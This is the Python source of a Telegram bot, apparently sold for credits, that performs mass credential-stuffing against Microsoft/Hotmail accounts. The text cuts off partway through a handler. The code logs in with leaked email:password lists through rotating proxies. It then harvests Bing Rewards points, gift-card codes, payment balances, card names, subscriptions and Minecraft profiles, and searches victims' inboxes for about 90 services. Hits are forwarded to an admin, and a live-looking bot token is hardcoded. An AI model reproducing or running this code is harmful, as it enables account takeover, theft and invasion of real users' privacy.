import re, json, uuid, sqlite3, logging, asyncio
import time, os, random, threading, requests, urllib3, io
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, ContextTypes, filters)

# ============================================================================
# LOGGING & SETUP
# ============================================================================
urllib3.disable_warnings()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# CONFIG
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 5944410248))
DB_PATH = os.environ.get('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500

# flux.py login URL
SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

PROXIES_LIST = []
bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()

# ============================================================================
# AkazaDatabase CLASS
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), commit=True, fetchone=False, fetchall=False):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            try:
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            except Exception as e:
                logger.error(f"DB Error: {e}")
            finally:
                conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, is_adding_kw INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
            status TEXT, details TEXT, date TEXT)''')
        self.add_user(ADMIN_ID, "Admin", "Admin")
        self._execute('UPDATE users SET is_mod = 1, has_access = 1, credits = 999999 WHERE user_id = ?', (ADMIN_ID,))

    def add_user(self, uid, username, first_name):
        now = datetime.now().isoformat()
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)', (uid, username, first_name, now))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid) -> bool:
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_banned']) if res else False

    def has_access(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res['is_banned']: return False
        if res['has_access'] == 0: return False
        if res['access_expiry']:
            try:
                if datetime.now() > datetime.fromisoformat(res['access_expiry']): return False
            except: pass
        return True

    def is_mod(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_mod']) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def get_credits(self, uid) -> int:
        if uid == ADMIN_ID: return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res['credits'] if res else 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self) -> list:
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [row['user_id'] for row in res] if res else []

    def get_user_info(self, uid) -> dict:
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return dict(res) if res else {}

    def get_user_settings(self, uid) -> dict:
        res = self._execute('SELECT keywords, threads, is_adding_kw FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res['keywords'].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res['threads'], 'is_adding_kw': bool(res['is_adding_kw'])}
        return {'keywords': [], 'threads': 10, 'is_adding_kw': False}

    def update_settings(self, uid, keywords=None, threads=None, is_adding_kw=None):
        if keywords is not None:
            self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
        if threads is not None:
            self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if is_adding_kw is not None:
            self._execute('UPDATE settings SET is_adding_kw = ? WHERE user_id = ?', (1 if is_adding_kw else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        now = datetime.now().isoformat()
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details_dict), now))
        if status == 'hit':
            self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid) -> dict:
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return {'checks': res['total_checks'], 'hits': res['total_hits'], 'credits': res['credits']} if res else {'checks': 0, 'hits': 0, 'credits': 0}

    def get_global_stats(self) -> dict:
        t = self._execute('SELECT COUNT(*) as total FROM users', fetchone=True)
        a = self._execute('SELECT COUNT(*) as active FROM users WHERE has_access = 1 AND is_banned = 0', fetchone=True)
        c = self._execute('SELECT SUM(total_checks) as checks FROM users', fetchone=True)
        h = self._execute('SELECT SUM(total_hits) as hits FROM users', fetchone=True)
        return {
            'total': t['total'] if t else 0,
            'active': a['active'] if a else 0,
            'checks': c['checks'] if c and c['checks'] else 0,
            'hits': h['hits'] if h and h['hits'] else 0
        }

    def list_mods(self) -> list:
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': row['user_id'], 'username': row['username']} for row in res] if res else []

akaza_db = AkazaDatabase(DB_PATH)

# ============================================================================
# SERVICE_KEYWORDS DICT
# ============================================================================
SERVICE_KEYWORDS = {
    "instagram.com": "Instagram", "mail.instagram.com": "Instagram",
    "facebook.com": "Facebook", "facebookmail.com": "Facebook",
    "twitter.com": "Twitter", "x.com": "Twitter",
    "tiktok.com": "TikTok", "snapchat.com": "Snapchat",
    "discord.com": "Discord", "telegram.org": "Telegram",
    "reddit.com": "Reddit", "linkedin.com": "LinkedIn",
    "twitch.tv": "Twitch", "onlyfans.com": "OnlyFans",
    "patreon.com": "Patreon", "vk.com": "VK",
    "whatsapp.com": "WhatsApp", "youtube.com": "YouTube",
    "netflix.com": "Netflix", "info@netflix.com": "Netflix",
    "spotify.com": "Spotify", "disneyplus.com": "Disney+",
    "hulu.com": "Hulu", "hbo.com": "HBO",
    "amazon.com": "Amazon", "primevideo.com": "Prime Video",
    "apple.com": "Apple", "peacocktv.com": "Peacock",
    "paramountplus.com": "Paramount+", "tidal.com": "Tidal",
    "deezer.com": "Deezer", "xbox.com": "Xbox",
    "playstation.com": "PlayStation", "nintendo.com": "Nintendo",
    "steampowered.com": "Steam", "epicgames.com": "Epic Games",
    "riotgames.com": "Riot Games", "minecraft.net": "Minecraft",
    "roblox.com": "Roblox", "ubisoft.com": "Ubisoft",
    "ea.com": "EA", "blizzard.com": "Blizzard",
    "valorant.com": "Valorant", "fortnite.com": "Fortnite",
    "pubg.com": "PUBG", "callofduty.com": "COD",
    "rockstargames.com": "Rockstar", "paypal.com": "PayPal",
    "venmo.com": "Venmo", "cash.app": "CashApp",
    "stripe.com": "Stripe", "revolut.com": "Revolut",
    "wise.com": "Wise", "coinbase.com": "Coinbase",
    "binance.com": "Binance", "kraken.com": "Kraken",
    "robinhood.com": "Robinhood", "ebay.com": "eBay",
    "aliexpress.com": "AliExpress", "etsy.com": "Etsy",
    "walmart.com": "Walmart", "target.com": "Target",
    "shopify.com": "Shopify", "nike.com": "Nike",
    "adidas.com": "Adidas", "ubereats.com": "UberEats",
    "doordash.com": "DoorDash", "grubhub.com": "GrubHub",
    "deliveroo.co.uk": "Deliveroo", "uber.com": "Uber",
    "lyft.com": "Lyft", "airbnb.com": "Airbnb",
    "booking.com": "Booking.com", "expedia.com": "Expedia",
    "dropbox.com": "Dropbox", "google.com": "Google Drive",
    "onedrive.com": "OneDrive", "icloud.com": "iCloud",
    "nordvpn.com": "NordVPN", "expressvpn.com": "ExpressVPN",
    "surfshark.com": "Surfshark", "protonvpn.com": "ProtonVPN",
    "coursera.org": "Coursera", "udemy.com": "Udemy",
    "duolingo.com": "Duolingo", "grammarly.com": "Grammarly",
    "office365.com": "Office 365", "zoom.us": "Zoom",
    "slack.com": "Slack", "adobe.com": "Adobe",
    "canva.com": "Canva"
}

# ============================================================================
# AkazaChecker CLASS
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            px = self.format_proxy(proxy)
            self.session.proxies = {'http': px, 'https': px}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        })

    def format_proxy(self, px):
        px = px.strip()
        if px.startswith(('http://', 'https://', 'socks')): return px
        p = px.split(':')
        if len(p) == 4: return f'http://{p[2]}:{p[3]}@{p[0]}:{p[1]}'
        return f'http://{px}' if len(p) == 2 else px

    def get_sftag_params(self):
        for _ in range(3):
            try:
                r = self.session.get(SFTAG_URL, timeout=10).text
                ppft = re.search(r'value=\\\\"(.+?)\\\\"', r, re.S) or re.search(r'value="(.+?)"', r, re.S) or re.search(r"sFTTag:'(.+?)'", r, re.S) or re.search(r'sFTTag:"(.+?)"', r, re.S) or re.search(r'name="PPFT".*?value="(.+?)"', r, re.S)
                up = re.search(r'"urlPost":"(.+?)"', r, re.S) or re.search(r"urlPost:'(.+?)'", r, re.S) or re.search(r'<form.*?action="(.+?)"', r, re.S)
                if ppft and up: return up.group(1).replace('&amp;', '&'), ppft.group(1)
            except: pass
            time.sleep(0.1)
        return None, None

    def do_login(self, email, password, urlPost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                r = self.session.post(urlPost, data=data, allow_redirects=True, timeout=10)
                if '#' in r.url and r.url != SFTAG_URL:
                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                    if tk and tk != 'None': return 'TOKEN', tk
                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return '2FA', None
                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return 'BAD', None
            except: pass
        return 'ERROR', None

    def handle_fmhf(self, resp):
        for _ in range(5):
            soup = BeautifulSoup(resp.text, 'html.parser')
            f = soup.find('form', id='fmHF')
            if not f: break
            data = {i.get('name'): i.get('value', '') for i in f.find_all('input') if i.get('name')}
            act = f.get('action')
            if act.startswith('/'): act = 'https://login.live.com' + act
            resp = self.session.post(act, data=data)
        return resp

    def get_rewards_points(self):
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", headers={'Referer': 'https://rewards.bing.com/'}, timeout=8)
            if r.status_code == 200:
                d = r.json()
                pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if pts is not None: return int(pts)
            r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", timeout=8)
            if r.status_code == 200:
                d = r.json()
                if 'userInfo' in d and 'balance' in d['userInfo']: return int(d['userInfo']['balance'])
            r = self.handle_fmhf(self.session.get("https://rewards.bing.com", timeout=10))
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m and 0 <= int(m.group(1)) <= 500000: return int(m.group(1))
        except: pass
        return 0

    def get_redemption_codes(self):
        codes = []
        try:
            r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10))
            soup = BeautifulSoup(r.text, 'html.parser')
            vt = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = vt.get('value', '') if vt else ''
            rows = soup.find('table', class_='table').find_all('tr') if soup.find('table', class_='table') else []
            pats = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
            for row in rows:
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                title = row.find_all('td')[2].get_text(strip=True) if len(row.find_all('td')) > 2 else ''
                date = row.find_all('td')[1].get_text(strip=True) if len(row.find_all('td')) > 1 else ''
                if btn:
                    act = 'https://rewards.bing.com' + btn.get('data-actionurl', '').replace('&amp;', '&')
                    cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10).text
                    for p in pats:
                        m = re.search(p, cr)
                        if m and '*' not in m.group():
                            ru = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', cr)
                            codes.append({'code': m.group(), 'category': self.detect_category(title, cr), 'redemption_url': ru.group(1) if ru else '', 'date': date})
                            break
        except: pass
        return codes

    def detect_category(self, title, row_text=''):
        t = (title + row_text).lower()
        if 'overwatch' in t: return 'Overwatch'
        if 'sea of thieves' in t or 'ancient coins' in t: return 'Sea of Thieves'
        if 'roblox' in t or 'robux' in t: return 'Roblox'
        if 'league of legends' in t or 'riot points' in t: return 'League of Legends'
        if 'game pass' in t or 'gamepass' in t: return 'Game Pass'
        if 'minecraft' in t or 'minecoins' in t: return 'Minecraft'
        if any(x in t for x in ['gift card', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'spotify']): return 'Gift Card'
        return 'Unknown'

    def get_microsoft_subs(self):
        try:
            uid = str(uuid.uuid4()).replace('-', '')[:16]
            u = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none"
            r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)
            tk = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
            if not tk: return {"status":"FREE","subs":[]}
            h = {"Authorization": f'MSADELEGATE1.0="{unquote(tk.group(1))}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com"}
            bal_r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=h, timeout=12).text
            bal = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_r)
            card = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_r, re.S)
            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=h, timeout=12).text
            subs = []
            for k in ['Xbox Game Pass Ultimate', 'PC Game Pass', 'EA Play', 'Xbox Live Gold', 'Microsoft 365 Family', 'Office 365', 'OneDrive']:
                if k in rt:
                    rd = re.search(rf'"{k}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt)
                    subs.append({'name': k, 'is_expired': False, 'renewal_date': rd.group(1) if rd else ''})
            return {"status": "PREMIUM" if subs else "FREE", "subs": subs, "balance": "$"+bal.group(1) if bal else "", "card": card.group(1) if card else ""}
        except: return {"status":"FREE","subs":[]}

    def get_profile(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=12).json()
            return r.get('displayName', 'N/A'), r.get('country') or r.get('location', {}).get('country') or 'N/A'
        except: return 'N/A', 'N/A'

    def get_minecraft(self, tk):
        try:
            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties":{"AuthMethod":"RPS","SiteName":"user.auth.xboxlive.com","RpsTicket":f"d={tk}"},"RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"}, timeout=10).json()
            r2 = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties":{"SandboxId":"RETAIL","UserTokens":[r1['Token']]},"RelyingParty":"rp://api.minecraftservices.com/","TokenType":"JWT"}, timeout=10).json()
            r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken":f"XBL3.0 x={r1['DisplayClaims']['xui'][0]['uhs']};{r2['Token']}"}, timeout=10).json()
            r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization":f"Bearer {r3['access_token']}"}, timeout=10)
            if r4.status_code == 200: d = r4.json(); return {"owned": True, "username": d['name'], "uuid": d['id'], "capes": [c['alias'] for c in d.get('capes', [])]}
        except: pass
        return {"owned": False}

    def scan_inbox(self, tk, cid, uk):
        res = {}
        combined = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
        # Optimized "Smart Batching" - 20 keywords per request, parse results for attribution
        for i in range(0, len(combined), 20):
            batch = combined[i:i+20]
            q = " OR ".join([f'"{k}"' for k in batch])
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 25}]}
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=12).json()
                rset = r['EntitySets'][0]['ResultSets'][0]
                if rset.get('Total', 0) > 0:
                    for hit in rset.get('Results', []):
                        text = (hit.get('Subject', '') + hit.get('Preview', '')).lower()
                        for k in batch:
                            if k.lower() in text:
                                name = SERVICE_KEYWORDS.get(k, k)
                                res[name] = res.get(name, 0) + 1
            except: pass
        return res

    async def check(self, email, password, uk=[], fast=False):
        loop = asyncio.get_running_loop()
        try:
            up, ppft = await loop.run_in_executor(bot_executor, self.get_sftag_params)
            if not up: return {'status': 'error'}
            st, tk = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
            if st != 'TOKEN': return {'status': st.lower(), 'email': email, 'password': password}
            cid = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), '')
            if fast:
                results = await asyncio.gather(
                    loop.run_in_executor(bot_executor, self.get_rewards_points),
                    loop.run_in_executor(bot_executor, self.get_redemption_codes)
                )
                pts, codes = results
                return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {}, 'name': 'N/A', 'country': 'N/A', 'mc': {'owned': False}, 'inbox': {}}
            results = await asyncio.gather(
                loop.run_in_executor(bot_executor, self.get_rewards_points),
                loop.run_in_executor(bot_executor, self.get_redemption_codes),
                loop.run_in_executor(bot_executor, self.get_microsoft_subs),
                loop.run_in_executor(bot_executor, self.get_profile, tk, cid),
                loop.run_in_executor(bot_executor, self.get_minecraft, tk),
                loop.run_in_executor(bot_executor, self.scan_inbox, tk, cid, uk)
            )
            pts, codes, subs, (name, country), mc, inbox = results
            return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country, 'mc': mc, 'inbox': inbox}
        except: return {'status': 'error', 'email': email, 'password': password}

# ============================================================================
# BOT HANDLERS
# ============================================================================
user_proxies = {}
pending_files = {}

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    akaza_db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if akaza_db.is_banned(uid): return
    akaza_db.update_settings(uid, is_adding_kw=False)
    i, s = akaza_db.get_user_info(uid), akaza_db.get_user_settings(uid)
    msg = (f"💠 <b>AKAZA Bot Dashboard</b> 💠\n\n"
           f"👤 <b>User:</b> <code>{u.effective_user.first_name}</code>\n"
           f"💰 <b>Credits:</b> <code>{i['credits']}</code>\n"
           f"⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n"
           f"🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>")
    kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("🔍 Keywords", callback_data="kw_mode"), InlineKeyboardButton("🌐 Proxy", callback_data="proxy")],
           [InlineKeyboardButton("📖 Help", callback_data="help")]]
    if akaza_db.is_mod(uid): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    if u.callback_query: await u.callback_query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")
    else: await u.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    s = akaza_db.get_user_settings(uid)
    if s['is_adding_kw']:
        kws = u.message.text.split()
        all_kws = list(set(s['keywords'] + kws))
        akaza_db.update_settings(uid, keywords=all_kws)
        await u.message.reply_text(f"✅ Added {len(kws)} keywords. Total: {len(all_kws)}.\nUse /skw to stop.")
        return
    if ':' in u.message.text: await handle_combo(u, c, u.message.text)

async def handle_document(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    doc = u.message.document
    if not doc or not doc.file_name.lower().endswith('.txt'): return
    file = await c.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', 'ignore')
    pending_files[uid] = content
    kbd = [[InlineKeyboardButton("📁 Combo List", callback_data="set_combo"), InlineKeyboardButton("🔌 Proxy List", callback_data="set_proxy")]]
    await u.message.reply_text(f"❓ <b>File:</b> <code>{doc.file_name}</code>\nSelect the file type:", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid) or not akaza_db.has_access(uid): return
    if not text: text = pending_files.pop(uid, "")
    lines = [l.strip() for l in text.splitlines() if ':' in l]
    if not lines: return
    s = akaza_db.get_user_settings(uid)
    px = user_proxies.get(uid, []) or PROXIES_LIST
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)
    status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
    hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
    sid = str(uuid.uuid4().hex[:6])
    h_f, tfa_f = f"h_{sid}.txt", f"t_{sid}.txt"
    sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()

    async def worker(line):
        nonlocal hits, bad, tfa, err, checked, last_up, last_h
        async with sem:
            try:
                parts = line.split(':', 1)
                p = random.choice(px) if px else None
                data = await AkazaChecker(p).check(parts[0].strip(), parts[1].strip(), s['keywords'], s['fast_mode'])
            except: data = {'status': 'error'}
            checked += 1; akaza_db.use_credit(uid); akaza_db.save_result(uid, data.get('email',''), data['status'], data)
            st = data['status']
            if st == 'hit':
                hits += 1; pts = data.get('pts', 0)
                tier = '💎 ULTRA HIT' if pts >= 20000 else '⭐ PREMIUM HIT' if pts >= 7000 else '🎯 HIT'
                msg = f"{tier}\n📧 `{data['email']}`\n🔑 `{data['password']}`\n👤 {data.get('name','N/A')} | 🌍 {data.get('country','N/A')}\n⭐ Points: `{pts}`\n"
                codes = data.get('codes', [])
                if codes:
                    cat_map = {}
                    for co in codes: cat_map.setdefault(co.get('category','Unknown'), []).append(co)
                    for cat, clist in cat_map.items():
                        c_strs = [f"`{co['code']}`" + (f" [Redeem]({co['redemption_url']})" if co.get('redemption_url') else "") for co in clist]
                        msg += f"🎮 {cat}: {', '.join(c_strs)}\n"
                subs = data.get('subs', {}).get('subs', [])
                active = [su['name'] for su in subs if not su.get('is_expired')]
                if active: msg += f"🎮 MS Subs: {', '.join(active)}\n"
                if data.get('mc', {}).get('owned'): msg += f"⛏️ Minecraft: `{data['mc']['username']}`\n"
                if data.get('inbox'): msg += f"📬 Inbox: {', '.join([f'{k}({v})' for k,v in list(data['inbox'].items())[:5]])}\n"
                try: await c.bot.send_message(uid, msg, parse_mode='Markdown', disable_web_page_preview=True)
                except: pass
                if uid != ADMIN_ID:
                    try: await c.bot.send_message(ADMIN_ID, f"📢 User {uid} hit:\n{msg}", parse_mode='Markdown', disable_web_page_preview=True)
                    except: pass
                with open(h_f, 'a') as f:
                    if os.path.getsize(h_f) == 0: f.write("@larpsupport\n\n")
                    f.write(f"{data['email']}:{data['password']} | Pts:{pts} | Inbox:{len(data.get('inbox',{}))}\n")
                last_h.append(data['email']); last_h = last_h[-5:]
            elif st == '2fa': tfa += 1; open(tfa_f, 'a').write(f"{data.get('email','')}:{data.get('password','')}\n")
            elif st == 'error': err += 1
            else: bad += 1
            async with up_lock:
                if time.time() - last_up > 3 or checked == len(lines):
                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                    prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ❌ Errors: `{err}`\n\n🕒 Last Hits:\n`{' | '.join(last_h) or 'None'}`"
                    try: await status_msg.edit_text(prg, parse_mode='Markdown')
                    except: pass
    await asyncio.gather(*(worker(l) for l in lines))
    for f_p, disp in [(h_f, "Hotmails Hits @darkcloudgateway.txt"), (tfa_f, "2fa.txt")]:
        if os.path.exists(f_p):
            if f_p == h_f:
                with open(f_p, 'a') as f: f.write("\n@larpsupport")
            with open(f_p, 'rb') as f:
                content = f.read()
                if u.callback_query: await u.callback_query.message.reply_document(io.BytesIO(content), filename=disp, caption=f"✅ {disp}")
                else: await u.message.reply_document(io.BytesIO(content), filename=disp, caption=f"✅ {disp}")
                if uid != ADMIN_ID: await c.bot.send_document(ADMIN_ID, io.BytesIO(content), filename=disp, caption=f"📁 User {uid} Result")
            os.remove(f_p)

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "settings":
        s = akaza_db.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ <b>Settings</b>\n\nThreads: <code>{s['threads']}</code>\nUse /threads [N] to change.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "stats":
        st = akaza_db.user_stats(uid)
        await q.edit_message_text(f"📊 <b>Stats</b>\n\nChecks: <code>{st['checks']}</code>\nHits: <code>{st['hits']}</code>\nCredits: <code>{st['credits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "kw_mode":
        akaza_db.update_settings(uid, is_adding_kw=True)
        await q.edit_message_text("🔍 <b>Keyword Mode</b>\n\nSend keywords separated by spaces.\n/skw to stop, /ckw to clear.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "proxy":
        await q.edit_message_text(f"🌐 <b>Proxy</b>\n\nLoaded: {len(user_proxies.get(uid, []))}\nUpload .txt and select 'Proxy'.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "help":
